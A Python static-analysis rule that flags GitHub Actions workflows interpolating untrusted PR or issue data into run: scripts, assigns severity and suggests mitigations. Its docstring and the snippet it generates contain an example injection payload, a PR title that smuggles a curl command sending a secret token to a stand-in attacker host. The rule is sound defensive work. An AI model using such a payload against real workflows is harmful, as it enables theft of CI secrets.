"""GitHub Actions Script Injection Detection.

Detects command injection vulnerabilities where untrusted PR data (titles, body,
commit messages, branch names) is directly interpolated into shell scripts without
proper sanitization.

Attack Pattern:
1. Workflow uses github.event.pull_request.* or github.event.issue.* in run: script
2. Data not passed through environment variables (unsafe interpolation)
3. Attacker crafts PR title like: "; curl http://evil.com/steal?token=$SECRET"

CWE-77: Improper Neutralization of Special Elements used in a Command
"""

import json
import logging
import sqlite3
from typing import List, Set

from theauditor.rules.base import (
    RuleMetadata,
    StandardFinding,
    StandardRuleContext,
    Severity,
)

logger = logging.getLogger(__name__)

METADATA = RuleMetadata(
    name="github_actions_script_injection",
    category="injection",
    target_extensions=['.yml', '.yaml'],
    exclude_patterns=['.pf/', 'test/', '__tests__/', 'node_modules/'],
    requires_jsx_pass=False,
    execution_scope='database',
)

# Untrusted data paths that should not be in run: scripts
UNTRUSTED_PATHS: Set[str] = {
    'github.event.pull_request.title',
    'github.event.pull_request.body',
    'github.event.pull_request.head.ref',  # Branch name
    'github.event.pull_request.head.label',
    'github.event.issue.title',
    'github.event.issue.body',
    'github.event.comment.body',
    'github.event.review.body',
    'github.event.head_commit.message',
    'github.head_ref',  # Branch name shorthand
}


def find_pull_request_injection(context: StandardRuleContext) -> List[StandardFinding]:
    """Detect script injection from untrusted PR/issue data.

    Detection Logic:
    1. Find steps with run: scripts
    2. Check for references to untrusted github.event.* paths
    3. Verify references are in 'run' location (not 'env' which is safer)
    4. Report critical finding for command injection risk

    Args:
        context: Rule execution context with database path

    Returns:
        List of security findings
    """
    findings: List[StandardFinding] = []

    if not context.db_path:
        return findings

    conn = sqlite3.connect(context.db_path)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()

    try:
        # Find all steps with run scripts
        cursor.execute("""
            SELECT s.step_id, s.job_id, s.step_name, s.run_script,
                   j.workflow_path, j.job_key, w.workflow_name
            FROM github_steps s
            JOIN github_jobs j ON s.job_id = j.job_id
            JOIN github_workflows w ON j.workflow_path = w.workflow_path
            WHERE s.run_script IS NOT NULL
        """)

        for row in cursor.fetchall():
            step_id = row['step_id']
            run_script = row['run_script']

            # Check for untrusted references in run script
            cursor.execute("""
                SELECT reference_path, reference_location
                FROM github_step_references
                WHERE step_id = ?
                AND reference_location = 'run'
            """, (step_id,))

            untrusted_refs = []
            for ref_row in cursor.fetchall():
                ref_path = ref_row['reference_path']

                # Check if this is an untrusted data path
                for unsafe_path in UNTRUSTED_PATHS:
                    if ref_path.startswith(unsafe_path):
                        untrusted_refs.append(ref_path)
                        break

            if untrusted_refs:
                # Analyze workflow trigger for severity
                cursor.execute("""
                    SELECT on_triggers FROM github_workflows WHERE workflow_path = ?
                """, (row['workflow_path'],))

                trigger_row = cursor.fetchone()
                triggers = json.loads(trigger_row['on_triggers']) if trigger_row and trigger_row['on_triggers'] else []

                # Higher severity for pull_request_target (write context)
                has_pr_target = 'pull_request_target' in triggers
                severity = Severity.CRITICAL if has_pr_target else Severity.HIGH

                findings.append(_build_injection_finding(
                    workflow_path=row['workflow_path'],
                    workflow_name=row['workflow_name'],
                    job_key=row['job_key'],
                    step_name=row['step_name'] or 'Unnamed step',
                    run_script=run_script,
                    untrusted_refs=untrusted_refs,
                    severity=severity,
                    has_pr_target=has_pr_target
                ))

    finally:
        conn.close()

    return findings


def _build_injection_finding(workflow_path: str, workflow_name: str,
                             job_key: str, step_name: str, run_script: str,
                             untrusted_refs: List[str], severity: Severity,
                             has_pr_target: bool) -> StandardFinding:
    """Build finding for script injection vulnerability.

    Args:
        workflow_path: Path to workflow file
        workflow_name: Workflow display name
        job_key: Job key
        step_name: Step display name
        run_script: Shell script content
        untrusted_refs: List of untrusted reference paths
        severity: Calculated severity
        has_pr_target: Whether workflow uses pull_request_target

    Returns:
        StandardFinding object
    """
    refs_str = ', '.join(untrusted_refs[:3])
    if len(untrusted_refs) > 3:
        refs_str += f" (+{len(untrusted_refs) - 3} more)"

    message = (
        f"Workflow '{workflow_name}' job '{job_key}' step '{step_name}' "
        f"uses untrusted data in run: script without sanitization: {refs_str}. "
        f"Attacker can inject commands via {'pull_request_target context' if has_pr_target else 'PR metadata'}."
    )

    # Extract vulnerable line from run script
    snippet_lines = []
    for line in run_script.split('\n'):
        if any(ref.replace('github.event.', '') in line for ref in untrusted_refs):
            snippet_lines.append(line.strip())
            if len(snippet_lines) >= 3:
                break

    code_snippet = f"""
# Vulnerable Pattern in {job_key}:
- name: {step_name}
  run: |
    # VULN: Untrusted data in shell script
    {chr(10).join(snippet_lines[:3])}

# Attack Example:
# PR title: "; curl http://evil.com/steal?token=$SECRET #"
# Executes: echo "PR title: ; curl http://evil.com/steal?token=$SECRET #"
    """

    details = {
        'workflow': workflow_path,
        'workflow_name': workflow_name,
        'job_key': job_key,
        'step_name': step_name,
        'untrusted_references': untrusted_refs,
        'has_pull_request_target': has_pr_target,
        'run_script_preview': run_script[:200] if len(run_script) > 200 else run_script,
        'mitigation': (
            "1. Pass untrusted data through environment variables instead of direct interpolation:\n"
            "   env:\n"
            "     PR_TITLE: ${{ github.event.pull_request.title }}\n"
            "   run: echo \"Title: $PR_TITLE\"\n"
            "2. Validate/sanitize input with regex before use\n"
            "3. Use github-script action for safer JavaScript execution"
        )
    }

    return StandardFinding(
        file_path=workflow_path,
        line=0,
        rule_name="pull_request_injection",
        message=message,
        severity=severity,
        category="injection",
        confidence="high",
        snippet=code_snippet.strip(),
        cwe_id="CWE-77",
        additional_info=details
    )
